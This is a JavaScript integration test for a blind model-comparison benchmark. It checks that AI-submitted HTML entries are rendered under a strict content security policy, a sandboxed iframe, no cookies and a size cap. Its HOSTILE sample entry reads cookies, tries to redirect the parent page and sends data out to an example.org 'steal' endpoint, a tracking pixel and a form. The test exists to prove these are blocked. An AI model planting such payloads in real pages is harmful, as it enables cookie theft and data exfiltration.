'use strict';

const assert = require('assert');
const { boot, check, done } = require('./helpers/boot');

const HOSTILE = [
    '<!doctype html><html><body><script>',
    'document.cookie;',
    'try { parent.location = "https://example.org/"; } catch (e) {}',
    'fetch("https://example.org/steal").catch(function(){});',
    'new Image().src = "https://example.org/pixel";',
    '<form action="https://example.org/post"><input name="x"></form>',
    '</script><p>hostile</p></body></html>',
].join('');

(async () => {
    const t = await boot();
    const alice = t.network.addUser('alice');
    const bob = t.network.addUser('bob');
    const svc = t.network.serviceToken({ sub: 'svc:games', audience: 'openvibe.bench', cap: ['bench.entry.create'] });

    let roundId;
    let entryA;
    let entryB;

    await check('the nine showcase kinds exist with a renderer, a judge and an entry schema', async () => {
        const r = await t.get('/api/v1/kinds');
        assert.strictEqual(r.status, 200, r.text);
        const byId = new Map(r.json().kinds.map((k) => [k.id, k]));
        assert.strictEqual(r.json().kinds.length, 24);
        const want = ['games.play', 'games.three', 'design.svg', 'design.motion', 'design.ui', 'design.dataviz', 'design.model3d', 'design.shader', 'design.interface'];
        for (const id of want) {
            const k = byId.get(id);
            assert.ok(k, 'missing kind ' + id);
            assert.ok(k.renderer === 'script' || k.renderer === 'static', id + ' renderer');
            assert.ok(k.judge, id + ' judge');
            assert.ok(k.schema && k.schema.entry && k.schema.payload, id + ' entry schema');
            assert.ok(k.limit_ms > 0, id + ' time limit');
        }
        assert.strictEqual(byId.get('games.play').limit_ms, 120000);
        assert.strictEqual(byId.get('design.ui').limit_ms, 20000);
        assert.strictEqual(byId.get('games.three').limit_ms, 60000);
        assert.strictEqual(byId.get('design.svg').renderer, 'static');
    });

    await check('the ten showcase prompts are seeded across at least five kinds', async () => {
        const r = await t.get('/api/v1/kinds');
        const kinds = new Set(r.json().kinds.map((k) => k.id));
        const rows = await t.ctx.s.db.many("SELECT kind_id, COUNT(*)::int AS n FROM bench_tasks WHERE public = true GROUP BY kind_id");
        assert.ok(rows.length >= 5, 'at least five kinds seeded');
        for (const row of rows) assert.ok(kinds.has(row.kind_id), row.kind_id);
    });

    await check('a hostile entry is served under a strict CSP with no cookies', async () => {
        const task = await t.get('/api/v1/kinds/games.play/tasks', { as: alice, json: { prompt: 'A hostile game.', public: true } });
        assert.strictEqual(task.status, 201, task.text);
        const rr = await t.get('/api/v1/tasks/' + task.json().task.id + '/rounds', { as: alice, json: {} });
        assert.strictEqual(rr.status, 201, rr.text);
        roundId = rr.json().round.id;
        const e1 = await t.get('/api/v1/rounds/' + roundId + '/entries', { bearer: svc, json: { provider: 'acme', model: 'alpha-1', payload: { html: HOSTILE } } });
        assert.strictEqual(e1.status, 201, e1.text);
        entryA = e1.json().entry.id;
        const e2 = await t.get('/api/v1/rounds/' + roundId + '/entries', { bearer: svc, json: { provider: 'beta', model: 'beta-2', payload: { html: '<p>calm</p>' } } });
        assert.strictEqual(e2.status, 201, e2.text);
        entryB = e2.json().entry.id;

        const doc = await t.get('/render/e/' + entryA);
        assert.strictEqual(doc.status, 200, doc.text);
        const csp = doc.headers.get('content-security-policy') || '';
        assert.ok(csp.includes("connect-src 'none'"), 'no network: ' + csp);
        assert.ok(csp.includes("form-action 'none'"), 'no forms: ' + csp);
        assert.ok(csp.includes("default-src 'none'"), 'default none: ' + csp);
        assert.ok(csp.includes('frame-ancestors'), 'frame ancestors: ' + csp);
        assert.ok(csp.includes("script-src 'nonce-"), 'scripts carry our nonce: ' + csp);
        assert.ok(!csp.includes('unsafe-inline') || csp.includes("style-src 'unsafe-inline'"), 'no inline script allowance');
        assert.ok(!doc.headers.get('set-cookie'), 'the render origin sets no cookie');
        assert.ok(doc.text.includes('nonce='), 'the model script carries the nonce');
    });

    await check('the wrapper sandboxes the model frame with scripts only', async () => {
        const w = await t.get('/render/w/' + entryA);
        assert.strictEqual(w.status, 200, w.text);
        assert.ok(w.text.includes('sandbox="allow-scripts"'), 'the child frame allows scripts');
        for (const forbidden of ['allow-same-origin', 'allow-forms', 'allow-popups', 'allow-top-navigation', 'allow-downloads']) {
            assert.ok(!w.text.includes(forbidden), 'the child frame must not allow ' + forbidden);
        }
        assert.ok(w.text.includes('data-limit-ms="120000"'), 'the wrapper knows the kind clock');
        assert.ok(w.text.includes('id="stop"'), 'the wrapper has a stop button');
        assert.ok(!w.headers.get('set-cookie'), 'the wrapper sets no cookie');
    });

    await check('an entry is capped at 200 KB', async () => {
        const big = '<p>' + 'x'.repeat(300 * 1024) + '</p>';
        const task = await t.get('/api/v1/kinds/design.ui/tasks', { as: alice, json: { prompt: 'A huge page.', public: true } });
        const rr = await t.get('/api/v1/tasks/' + task.json().task.id + '/rounds', { as: alice, json: {} });
        const rid = rr.json().round.id;
        const eid = t.ctx.s.newId('bte');
        await t.ctx.s.db.exec(
            'INSERT INTO bench_entries (id, round_id, provider, model, route, payload, cost_usd, ms, tokens, created_at) VALUES ($1, $2, $3, $4, $5::jsonb, $6::jsonb, 0, 1, 1, now())',
            [eid, rid, 'acme', 'alpha-1', JSON.stringify({ provider: 'acme', model: 'alpha-1' }), JSON.stringify({ html: big })]);
        const doc = await t.get('/render/e/' + eid);
        assert.strictEqual(doc.status, 200, doc.text);
        assert.ok(Buffer.byteLength(doc.text, 'utf8') <= 200 * 1024 + 4096, 'the entry is capped');
        assert.ok(Buffer.byteLength(doc.text, 'utf8') < 300 * 1024, 'the entry was cut down');
    });

    await check('the gallery lists the pairs blind', async () => {
        const r = await t.get('/api/v1/showcase/pairs');
        assert.strictEqual(r.status, 200, r.text);
        const pair = r.json().pairs.find((p) => p.id === roundId);
        assert.ok(pair, 'the round is in the gallery');
        assert.strictEqual(pair.slots.length, 2);
        assert.strictEqual(pair.slots[0].slot, 'A');
        assert.strictEqual(pair.slots[1].slot, 'B');
        assert.strictEqual(pair.slots[0].model, undefined, 'no model before the vote');
        assert.ok(pair.slots[0].wrapper_url.startsWith('/render/w/'));
    });

    await check('the compare page is blind, and the vote reveals', async () => {
        const before = await t.get('/api/v1/showcase/rounds/' + roundId, { as: bob });
        assert.strictEqual(before.status, 200, before.text);
        assert.strictEqual(before.json().round.revealed, false);
        assert.strictEqual(before.json().round.slots[0].model, undefined);

        const page = await t.get('/showcase/round/' + roundId, { as: bob });
        assert.strictEqual(page.status, 200, page.text);
        assert.ok(page.text.includes('data-slot="A"'), 'pane A');
        assert.ok(page.text.includes('data-slot="B"'), 'pane B');
        assert.ok(page.text.includes('data-vote-form="1"'), 'the vote form');
        assert.ok(!page.text.includes('alpha-1'), 'no model name before the vote');

        const vote = await t.get('/api/v1/showcase/rounds/' + roundId + '/vote', { as: bob, json: { outcome: 'A' } });
        assert.strictEqual(vote.status, 201, vote.text);
        assert.strictEqual(vote.json().revealed, true);

        const after = await t.get('/api/v1/showcase/rounds/' + roundId, { as: bob });
        assert.strictEqual(after.json().round.revealed, true);
        assert.ok(after.json().round.slots[0].model, 'the model is open after the vote');
    });

    await check('one vote per person, and a creator never votes on their own round', async () => {
        const again = await t.get('/api/v1/showcase/rounds/' + roundId + '/vote', { as: bob, json: { outcome: 'B' } });
        assert.strictEqual(again.status, 409, again.text);
        const owner = await t.get('/api/v1/showcase/rounds/' + roundId + '/vote', { as: alice, json: { outcome: 'A' } });
        assert.strictEqual(owner.status, 403, owner.text);
    });

    await check('the stats endpoint answers with Elo, an interval, cost and time', async () => {
        const r = await t.get('/api/v1/showcase/stats');
        assert.strictEqual(r.status, 200, r.text);
        assert.ok(Array.isArray(r.json().kinds));
        const games = r.json().kinds.find((k) => k.kind_id === 'games.play');
        assert.ok(games, 'the games kind is in the stats');
        const row = games.rows[0];
        assert.ok(typeof row.elo === 'number', 'elo');
        assert.ok('elo_ci_lower' in row && 'elo_ci_upper' in row, 'the Elo interval');
        assert.ok('cost_per_entry_usd' in row, 'cost per entry');
        assert.ok('median_ms' in row, 'time per entry');
        assert.ok('win_rate' in row && 'provisional' in row, 'win rate and the provisional flag');
    });

    await t.close();
    done();
})().catch((e) => { console.error(e); process.exit(1); });
